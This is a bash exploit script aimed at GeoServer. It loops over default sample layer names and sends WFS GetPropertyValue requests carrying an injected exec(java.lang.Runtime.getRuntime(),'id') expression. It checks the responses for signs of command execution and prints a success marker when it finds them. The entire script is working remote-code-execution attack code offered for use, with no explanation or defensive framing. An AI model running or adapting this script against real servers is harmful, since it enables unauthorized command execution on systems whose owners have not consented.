#!/bin/bash
# GeoServer RCE using default layer names
# 用法: rce_default_layers.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

echo "=== GeoServer RCE via Default Layers ==="

DEFAULT_LAYERS="sf:archsites topp:states tiger:poi sf:bugsites sf:restricted sf:streams sf:DEM topp:tasmania_roads"
FOUND=false

for base in "${ENDPOINT}/geoserver" "${ENDPOINT}"; do
  for layer in $DEFAULT_LAYERS; do
    for svc in ows wfs; do
      result=$(curl -s "${base}/${svc}?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 10 2>/dev/null)
      if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
        echo "[+] 命中: ${base}/${svc} layer=${layer}"
        echo "$result"
        echo "GEOSERVER_RCE_SUCCESS"
        FOUND=true
        break 3
      fi
    done
  done
done

if [ "$FOUND" = false ]; then
  echo "ALL_LAYERS_FAILED"
fi
